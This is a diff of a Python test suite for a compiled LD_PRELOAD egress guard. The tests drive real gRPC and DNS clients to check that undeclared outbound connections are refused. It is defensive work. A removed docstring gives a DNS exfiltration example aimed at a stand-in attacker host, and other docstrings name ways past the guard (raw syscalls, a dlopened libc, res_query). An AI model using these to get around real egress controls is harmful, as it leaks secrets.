@@ -1,31 +1,11 @@
 """The compiled egress layer, driven rather than inspected.
 
-Every assertion here about *enforcement* runs a real client in a real subprocess against a real
-listener, because the defect that licensed this layer is exactly the shape an inspecting test cannot
-see: `netguard.py` patches `socket.socket`, every unit test of it passed, and grpc's C-core walked
-past all of it. A test that read the source, or asserted that the chart sets `LD_PRELOAD`, would
-have been green throughout.
-
-Four arms, and the three controls are the point:
-
-  A  no interposer, non-loopback target  → SUCCEEDS. Without this the probe cannot observe success,
-     and a refusal proves nothing — the first attempt at this measurement aimed at an address that
-     does not speak gRPC and timed out identically in both directions.
-  B  interposer, non-loopback target     → refused.
-  C  interposer, loopback target         → SUCCEEDS. The layer must not break the dials this
-     deployment makes to Postgres, Temporal and the calc backend.
-  D  interposer, target allowlisted      → SUCCEEDS. What distinguishes an allowlist from a
-     deny-all; without it B and C are equally consistent with a layer that breaks every declared
-     destination (`test_an_address_on_the_derived_allowlist_is_reachable`).
-
-The listener is a **real gRPC server** in the test process, bound to `0.0.0.0` so the same port is
-reachable by both a loopback and a non-loopback address. `grpc.channel_ready_future` only resolves
-once the HTTP/2 transport is up, so "SUCCEEDED" means grpc's C-core actually connected.
-
-**The subprocess environment is scrubbed of proxy variables.** grpc reads `grpc_proxy`,
-`https_proxy` and `http_proxy` regardless of the target's scheme, and a sandbox with an ambient
-proxy would have arm B dialling a loopback proxy — which the interposer permits — so the arm would
-pass for the wrong reason and arm B would be measuring nothing.
+Enforcement is asserted by running a real gRPC client in a subprocess against a real listener,
+because grpc's C-core bypasses the Python `socket` patch and only a driven test can see that.
+Arms: A no interposer → succeeds (the probe can observe success); B interposer, non-loopback →
+refused; C interposer, loopback → succeeds; D interposer, allowlisted → succeeds. The listener binds
+`0.0.0.0` so one port serves both address kinds, and the subprocess environment is scrubbed of
+proxy variables so arm B cannot pass by dialling a loopback proxy.
 """
 
 from __future__ import annotations
@@ -63,25 +43,11 @@ _PRELOAD_VARIABLE = "LD_PRELOAD"
 
 
 def test_the_entrypoint_puts_the_project_venv_back_in_front_of_the_base_images() -> None:
-    """The image's `ENV PATH` is not the PATH a component gets, and bash is why.
+    """The entrypoint restores the project venv to the front of PATH before running any interpreter.
 
-    `deploy/Containerfile` sets `ENV PATH="/app/.venv/bin:${PATH}"`. The UBI python-311 base also
-    sets `BASH_ENV=/opt/app-root/bin/activate`, which bash sources on **non-interactive** startup —
-    before the first line of `entrypoint.sh` — and `activate` prepends `/opt/app-root/bin` ahead of
-    everything. Measured in the base image with the image's own PATH supplied::
-
-        $ docker run -e PATH="/app/.venv/bin:..." ubi9/python-311 bash -c 'command -v python'
-        /opt/app-root/bin/python
-
-    That interpreter has no `chemclaw`, so every `exec python -m chemclaw...` this script dispatches
-    — the background worker, the mcp face and both connector forms — resolved to it. `service`
-    escaped only because `uvicorn` is absent from `/opt/app-root/bin` and its lookup fell through.
-
-    Asserted here rather than in CI alone because CI could not see it: `image.yml`'s smoke loop runs
-    `docker run --entrypoint python`, which Docker resolves from `ENV PATH` with no shell, so
-    `BASH_ENV` never fires; and the step that does run this ENTRYPOINT passes an unknown component
-    and exits above every `exec`. A text assertion is weaker than driving the image, and it is what
-    a suite with no image build can hold — the driven half is the new arm in that workflow.
+    The UBI base sets `BASH_ENV=/opt/app-root/bin/activate`, which bash sources on non-interactive
+    startup and which prepends an interpreter without `chemclaw`. CI's smoke run uses
+    `--entrypoint python` and never triggers it, so this text assertion is the suite's guard.
     """
     entrypoint = _ENTRYPOINT.read_text(encoding="utf-8")
     restore = 'export PATH="/app/.venv/bin:${PATH}"'
@@ -89,18 +55,9 @@ def test_the_entrypoint_puts_the_project_venv_back_in_front_of_the_base_images()
         "entrypoint.sh does not put the project venv back in front of the base image's; every "
         "`exec python -m chemclaw...` it dispatches will resolve to an interpreter without chemclaw"
     )
-    # The offset of the first line that runs an interpreter *at all* — `exec`ed or not — found by
-    # line rather than by substring, and deliberately not "the first dispatch".
-    #
-    # Two drafts of this were wrong in opposite directions and both are worth keeping visible. The
-    # first took `entrypoint.index("exec python -m")`, which matched the sentence in the comment
-    # above rather than the command, and so failed on correct code: a locator that cannot tell
-    # prose from the thing it describes is the defect this file is about, inside the test written
-    # to catch it. The second compared against the first `exec`, and a mutation that moved the
-    # restore to the line immediately *above* that `exec` passed — because by then the arming
-    # block has already run `python -m chemclaw.cli.egress_preload` with the wrong interpreter,
-    # and under `set -e` that is where every component dies. "Before the first interpreter" is the
-    # property; "before dispatch" was a weaker one that happened to read the same.
+    # The first line that runs an interpreter at all, located by line so prose in comments cannot
+    # match. The PATH restore must precede it: the arming block already runs `python -m ...` under
+    # `set -e`.
     lines = entrypoint.split("\n")
     offsets: list[int] = []
     at = 0
@@ -123,20 +80,15 @@ def test_the_entrypoint_puts_the_project_venv_back_in_front_of_the_base_images()
 
 @pytest.fixture(scope="module")
 def interposer() -> Path:
-    """The built `.so`, compiled by the **same script the image build runs**.
+    """The built `.so`, compiled by the same script the image build runs.
 
-    Through `deploy/build-netguard-preload.sh` rather than a `gcc` line of its own: two invocations
-    of the compiler would let this file prove a binary the image does not ship, which is the
-    second-declaration defect the script exists to prevent. Building it here also means `-Werror`
-    covers the interposer on every run of this suite.
+    One build recipe means the suite proves the binary the image ships, and `-Werror` covers the
+    interposer on every run.
     """
     if shutil.which(os.environ.get("CC", "gcc")) is None:  # pragma: no cover - toolchain-dependent
         pytest.skip("no C compiler: the interposer cannot be built, so nothing here is measured")
-    # Into a directory that does **not** exist yet, deliberately. This fixture used to build into a
-    # temp root that always does, so it could not observe whether the script creates its own output
-    # directory -- and the image builds into `/app/lib`, which nothing creates. The result was a
-    # green suite and a failed `docker build`, found by CI rather than here. Mirroring the image's
-    # shape is what makes this fixture evidence about the thing the image runs.
+    # Build into a directory that does not exist yet, as the image does (`/app/lib`), so the
+    # script's own directory creation is exercised.
     target = (
         Path(os.environ.get("PYTEST_DEBUG_TEMPROOT", "/tmp"))
         / "netguard-preload-build"
@@ -203,9 +155,8 @@ except Exception as exc:
 def _drive(target: str, *, library: Path | None, allow: str = "", script: str = _CLIENT) -> str:
     """Run `script` against `target` in a clean subprocess, optionally with the interposer loaded.
 
-    Proxy variables are stripped: with one set, grpc dials the proxy instead of the target and every
-    arm would report success. `PYTHONPATH` is not set, so the child imports no first-party module
-    and the in-process Python guard plays no part in what is measured.
+    Proxy variables are stripped so grpc dials the target itself; `PYTHONPATH` is unset so the
+    in-process Python guard plays no part.
     """
     environment = {
         key: value
@@ -240,11 +191,9 @@ def test_arm_a_grpc_reaches_a_non_loopback_listener_without_the_interposer(
 def test_arm_b_grpc_cannot_reach_a_non_loopback_listener_with_the_interposer(
     grpc_server: int, interposer: Path
 ) -> None:
-    """The finding, closed: grpc's C-core is refused at libc, where Python cannot reach it.
+    """Grpc's C-core is refused at libc, where the Python guard cannot reach it.
 
-    `netguard.arm` patches `socket.socket` and the `socket` module resolvers, and measured against
-    this same listener a `grpc.insecure_channel` connected with its refusal counter flat. Here the
-    plain socket and grpc are refused by one mechanism, and the interposer's own line names the
+    The plain socket and grpc are refused by one mechanism, and the interposer's log line names the
     destination.
     """
     address = _non_loopback_address()
@@ -303,11 +252,10 @@ except Exception as exc:
 def test_an_ipv4_mapped_address_is_not_a_way_around_the_check(
     grpc_server: int, interposer: Path
 ) -> None:
-    """`::ffff:1.2.3.4` is an IPv4 destination wearing an IPv6 `sockaddr`.
+    """`::ffff:1.2.3.4` is an IPv4 destination in an IPv6 `sockaddr` and must be unwrapped.
 
-    Read as opaque v6 bytes it matches no v4 allowlist entry and no v4 loopback test, so a check
-    that did not unwrap it would refuse the legitimate form and — worse — let a mapped form of a
-    *refused* address through a table keyed on v4 text.
+    Otherwise it matches no v4 allowlist or loopback entry, refusing the legitimate form and letting
+    a mapped form of a refused address through.
     """
     address = _non_loopback_address()
     if address is None:  # pragma: no cover - single-interface host
@@ -367,11 +315,9 @@ except Exception as exc:
 
 
 def test_a_name_off_the_allowlist_never_reaches_the_resolver(interposer: Path) -> None:
-    """A DNS query is a round trip in its own right, and the name is the covert channel.
+    """A name off the allowlist is refused at `getaddrinfo`, so no DNS query leaves.
 
-    Refused at `getaddrinfo`, so nothing leaves — and the *allowed* arm is what makes this mean
-    something: an interposer that refused every lookup would pass the first assertion and break
-    every pod.
+    The allowed arm proves the interposer does not simply refuse every lookup.
     """
     own = socket.gethostname()
     refused = _drive("0:0", library=interposer, script=_RESOLVE_CLIENT)
@@ -438,31 +384,20 @@ _RESOLVER_FAMILY = ("gethostbyname", "gethostbyname2", "gethostbyname_r", "getho
 
 
 def test_the_whole_resolver_family_is_refused_and_not_only_getaddrinfo(interposer: Path) -> None:
-    """The DNS exfiltration channel the port-53 exemption left open, closed.
+    """The whole resolver family is refused, not only `getaddrinfo`.
 
-    `check_address` lets any datagram to a `/etc/resolv.conf` nameserver on port 53 through, and the
-    C header justified that by saying an off-allowlist *name* "never gets that far, because
-    `getaddrinfo` refuses it first". True of `getaddrinfo` and of nothing else. Measured on one
-    binary with the allowlist `127.0.0.1,localhost`: `getaddrinfo` was refused with `EAI_NONAME`
-    while all four names below returned the real address, with the resolve counter flat and nothing
-    written to stderr — so `gethostbyname("<secret>.attacker.example")` reached an attacker's
-    nameserver on a pod an operator reads as clean. It was also a disagreement with `netguard.py`
-    in the wrong direction: the Python layer patches `socket.gethostbyname` precisely because that
-    entry point matters.
-
-    Driven through `ctypes.CDLL(None)` rather than `socket.gethostbyname`, because CPython resolves
-    that through `getaddrinfo` and so cannot reach this family at all — part of why the gap
-    survived. Both arms use the host's own name, so neither needs a query to leave this host, and
-    the **allowed** arm is what stops an interposer that refuses every lookup passing.
+    The port-53 exemption lets datagrams to the configured nameserver through, so any resolver entry
+    point left uninterposed (`gethostbyname` and friends) would carry an arbitrary name to it.
+    Driven through `ctypes.CDLL(None)` because CPython's `socket.gethostbyname` goes via
+    `getaddrinfo`. The host's own name keeps queries local, and the allowed arm stops a
+    refuse-everything interposer passing.
     """
     own = socket.gethostname()
     refused = _drive(own, library=interposer, script=_RESOLVER_FAMILY_CLIENT)
     for entry_point in _RESOLVER_FAMILY:
         assert f"{entry_point} refused" in refused, refused
-    # glibc's own NXDOMAIN contract, measured rather than guessed: the `_r` forms answer 0 with a
-    # NULL result and `HOST_NOT_FOUND`, never a nonzero status (which means ERANGE to a caller).
-    # Asserted per entry point rather than as one loose substring — the first version of this line
-    # matched either `_r` report, and a mutation of one of the two survived it.
+    # glibc's NXDOMAIN contract: the `_r` forms return 0 with a NULL result and `HOST_NOT_FOUND`
+    # (a nonzero status means ERANGE to a caller). Asserted per entry point.
     for entry_point in ("gethostbyname_r", "gethostbyname2_r"):
         assert f"{entry_point} refused status=0 h_errno=1" in refused, refused
     assert "resolve=4 connect=0" in refused, refused
@@ -499,13 +434,10 @@ def _first_nameserver() -> str | None:
 
 
 def test_the_resolvers_own_address_stays_reachable_on_port_53(interposer: Path) -> None:
-    """Without this exemption the interposer breaks every lookup in the cluster.
+    """The resolver's own address stays reachable on port 53, or every cluster lookup breaks.
 
-    Cluster DNS is non-loopback, and a resolver that uses libc's public `connect`/`sendto` — c-ares,
-    which is what grpc resolves names with — would be refused by address before any name could be
-    judged. Measured both ways: with the exemption removed from the C source, this same datagram is
-    refused with `Operation not permitted`. The exemption is narrow on purpose — port 53 **and** an
-    address `/etc/resolv.conf` names — so it is not a hole a library can dial through.
+    Cluster DNS is non-loopback and c-ares (grpc's resolver) uses libc's `connect`/`sendto`. The
+    exemption is narrow: port 53 and an address `/etc/resolv.conf` names.
     """
     nameserver = _first_nameserver()
     if nameserver is None:  # pragma: no cover - loopback or absent resolver
@@ -568,14 +500,11 @@ print(f"sendmmsg SUCCEEDED {sent}" if sent > 0 else f"sendmmsg refused {ctypes.g
 
 
 def test_a_batched_datagram_to_an_undeclared_host_is_refused(interposer: Path) -> None:
-    """`sendmmsg` was on the conceded list, and it was measured connecting.
+    """A `sendmmsg` batch to an undeclared host is refused.
 
-    It is `sendmsg`'s batching form with one destination per message, so leaving it uninterposed
-    left a datagram channel past `connect`, past `sendto` and past `sendmsg`. Measured against a
-    real non-loopback route it sent both messages with the interposer armed; the check is six lines,
-    which is cheaper than the concession. One refused address refuses the whole batch, because a
-    partial send would report success for a batch this layer did not permit. The allowed arm is here
-    for the same reason as everywhere else in this file.
+    It carries one destination per message, so it must be checked like `sendto`/`sendmsg`. One
+    refused address refuses the whole batch, since a partial send would report success for traffic
+    this layer did not permit.
     """
     address = _non_loopback_address()
     if address is None:  # pragma: no cover - single-interface host
@@ -596,11 +525,10 @@ print(f"armed={netguard_preload.is_armed()}")
 
 
 def test_armed_is_read_from_the_linker_and_not_from_the_environment(interposer: Path) -> None:
-    """An `LD_PRELOAD` naming a path that does not exist is ignored by the loader **in silence**.
+    """`is_armed()` asks `dlsym`, not the environment.
 
-    So a gauge fed from the variable would report a layer that is not there, which is the exact
-    failure this whole ADR is about: a signal an operator checks, reading health over an open path.
-    `is_armed()` asks `dlsym` instead.
+    The loader silently ignores an `LD_PRELOAD` naming a missing path, so a gauge fed from the
+    variable would report a layer that is not there.
     """
     loaded = _drive("unused", library=interposer, script=_ARMED_CLIENT)
     assert "armed=True" in loaded, loaded
@@ -650,11 +578,10 @@ def test_disabling_the_guard_disables_both_layers(monkeypatch: pytest.MonkeyPatc
 
 
 def test_the_entrypoint_preloads_the_path_the_image_installs() -> None:
-    """An `LD_PRELOAD` pointing at nothing is ignored by the loader without a word.
+    """The entrypoint preloads the path the image installs.
 
-    So the three spellings of this path — the Containerfile's build target, the entrypoint's export
-    and `netguard_preload.LIBRARY_PATH` — are pinned against each other rather than kept equal by
-    hand.
+    The loader ignores a missing `LD_PRELOAD` target silently, so the Containerfile's build target,
+    the entrypoint's export and `netguard_preload.LIBRARY_PATH` are pinned against each other.
     """
     containerfile = _CONTAINERFILE.read_text(encoding="utf-8")
     entrypoint = _ENTRYPOINT.read_text(encoding="utf-8")
@@ -666,11 +593,9 @@ def test_the_entrypoint_preloads_the_path_the_image_installs() -> None:
 
 
 def test_the_image_builds_the_interposer_through_the_one_build_recipe() -> None:
-    """The image must compile the source this suite measures, with the flags this suite uses.
+    """The image compiles the interposer through the same build script the suite uses.
 
-    A second `gcc` invocation is the whole risk: the suite would then prove a binary built one way
-    while the image shipped one built another, and `-Werror` or `-fPIC` drifting apart is exactly
-    the kind of difference that shows up only in the cluster.
+    A second `gcc` invocation would let the suite prove one binary while the image ships another.
     """
     containerfile = _CONTAINERFILE.read_text(encoding="utf-8")
     instructions = [
@@ -686,11 +611,10 @@ def test_the_image_builds_the_interposer_through_the_one_build_recipe() -> None:
 
 
 def test_no_shipped_deployment_starts_without_arming_the_compiled_layer() -> None:
-    """The `MCP_EGRESS_GUARD=off` shape, refused: arming is unconditional in the entrypoint.
+    """Arming is unconditional in the entrypoint.
 
-    Not inside a `case` branch, not behind a chart value, and not defaulted off — a component that
-    did not pass through the arming block would run with the compiled path open while both of the
-    Python layer's signals reported health.
+    Not inside a `case` branch, behind a chart value, or defaulted off: a component skipping it
+    would run with the compiled path open while the Python layer's signals reported health.
     """
     entrypoint = _ENTRYPOINT.read_text(encoding="utf-8")
     arming = entrypoint.index("chemclaw_egress_posture=")
@@ -713,15 +637,12 @@ def test_no_shipped_deployment_starts_without_arming_the_compiled_layer() -> Non
 #: `command:` **replaces** it rather than prefixing it, which is the whole of the finding below.
 _IMAGE_ENTRYPOINT = "/usr/local/bin/chemclaw-entrypoint"
 
-#: Containers that run this image and deliberately do **not** reach the entrypoint, each with the
-#: argument for it. A partition rather than a skip list: the test derives the real set from the
-#: templates, so a new workload with its own `command:` fails here until somebody writes the
-#: sentence — which is the step the three hook Jobs never had.
+#: Containers that run this image without reaching the entrypoint, each with its argument. The test
+#: derives the real set from the templates, so a new workload with its own `command:` fails until
+#: it is argued here.
 _CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT: dict[str, str] = {
-    # `git clone`/`fetch` against the note repository, on a loop. Named in `entrypoint.sh`'s own
-    # comment since the layer shipped: what they dial is a git remote, which is not on the settings
-    # object `derive_allowed` reads, so arming them would refuse the sync rather than bound it.
-    # They are bounded by the NetworkPolicy, and the ADR carries the open row.
+    # `git clone`/`fetch` against the note remote, which is not on the settings `derive_allowed`
+    # reads, so arming would refuse the sync. Bounded by the NetworkPolicy instead.
     "knowledge-sync-init": "git against the note remote, which no setting derives",
     "knowledge-sync": "git against the note remote, which no setting derives",
     "note-repo-init": "git against the note remote, which no setting derives",
@@ -731,15 +652,9 @@ _CONTAINERS_THAT_BYPASS_THE_ENTRYPOINT: dict[str, str] = {
 def _image_containers() -> dict[str, list[str]]:
     """Every container in the chart that runs `chemclaw.image`, mapped to its `command`.
 
-    Read off the template text because this suite is the offline half (`make helm-validate` is what
-    renders), and *derived* rather than listed because a listed set is exactly what was missing:
-    nothing checked that a container using this image reaches the image's `ENTRYPOINT`, so three
-    shipped Jobs ran with the loader variable unset while every assertion in this file stayed green.
-
-    A container is `- name: x` plus the fields indented two further; `command:` is matched at
-    exactly that field indentation, so a `lifecycle.preStop` hook's own `command` — nested deeper —
-    is not mistaken for the container's. Both spellings are read, the inline JSON list and the
-    block list, because the three Jobs used one each.
+    Derived from template text (this suite is offline; `make helm-validate` renders). `command:` is
+    matched at the container's own field indentation, so a nested `lifecycle` hook command is not
+    mistaken for it; both the inline JSON list and the block list forms are read.
     """
     chart = _ROOT / "deploy" / "helm" / "chemclaw" / "templates"
     found: dict[str, list[str]] = {}
@@ -777,19 +692,11 @@ def _image_containers() -> dict[str, list[str]]:
 
 
 def test_every_container_running_this_image_reaches_the_entrypoint_that_arms_it() -> None:
-    """A Kubernetes `command:` replaces the image `ENTRYPOINT` — it does not prefix it.
+    """Every container running this image reaches the entrypoint that arms it.
 
-    Arming happens inside `deploy/entrypoint.sh` and nowhere else, so a container that declares its
-    own `command:` runs with the compiled layer absent. Three shipped workloads did: the Schedules
-    hook Job (`python -m chemclaw.cli.schedules`, which runs on **every** `helm upgrade` and whose
-    entire outbound traffic is gRPC to Temporal through the Rust sdk-core — the exact class
-    `netguard.py` measurably cannot see), and both halves of the migration hook.
-
-    The test above could not see any of it, and that is why this one exists: it asserts that arming
-    precedes dispatch *inside* the script, and that no chart file *sets* the loader variable. Both
-    were true while three Jobs never ran the script at all. Nor could the metrics have answered it —
-    a hook Job declares no port, so `chemclaw_egress_preload_armed` is never scraped from one, and
-    the entrypoint is the only control those workloads have.
+    A Kubernetes `command:` replaces the image `ENTRYPOINT`, and arming happens only inside
+    `deploy/entrypoint.sh`, so a container with its own `command:` runs without the compiled layer.
+    Hook Jobs declare no port, so the armed gauge cannot reveal this either.
     """
     containers = _image_containers()
     assert len(containers) > 5, f"the container derivation found almost nothing: {containers}"
@@ -861,11 +768,9 @@ esac
 def test_a_failed_derivation_stops_the_container_rather_than_skipping_the_layer(
     tmp_path: Path,
 ) -> None:
-    """Fail closed.
+    """Fail closed: a broken posture derivation stops the container.
 
-    The one outcome that must not happen is a pod that starts unguarded because the posture query
-    broke — an unguarded process is indistinguishable from a guarded one until something
-    exfiltrates.
+    An unguarded pod is indistinguishable from a guarded one until something exfiltrates.
     """
     stub = tmp_path / "python"
     stub.write_text(_FAILING_POSTURE_STUB, encoding="utf-8")
@@ -884,16 +789,11 @@ def test_a_failed_derivation_stops_the_container_rather_than_skipping_the_layer(
 
 
 def test_the_interposer_states_what_it_cannot_cover() -> None:
-    """A layer that implies more than it enforces is the defect, not the documentation of it.
+    """The interposer's source states what dynamic linking lets past it.
 
-    The uncoverable classes are properties of dynamic linking rather than of this code, so they
-    cannot be asserted by running anything — what can be asserted is that the module says so, in the
-    file a reader opens. Each was driven first: `syscall(SYS_connect, …)` and a
-    `dlopen("libc.so.6")` + `dlsym("connect")` both reached a real gRPC server over a non-loopback
-    route with the interposer armed, and `res_query` returned a 61-byte answer for an off-allowlist
-    name. `sendmmsg` was on this list and was measured connecting too — it is interposed now rather
-    than conceded, which is why it must be *absent* here: a stale concession reads as a gap and
-    invites somebody to close it twice.
+    Raw `syscall(SYS_connect, …)`, a `dlopen`ed libc and `res_query` cannot be interposed, so the
+    assertion is that the module says so. `sendmmsg` is interposed and must be absent from that
+    list, since a stale concession reads as an open gap.
     """
     source = netguard_preload.SOURCE.read_text(encoding="utf-8")
     header = source.split("*/", 1)[0]
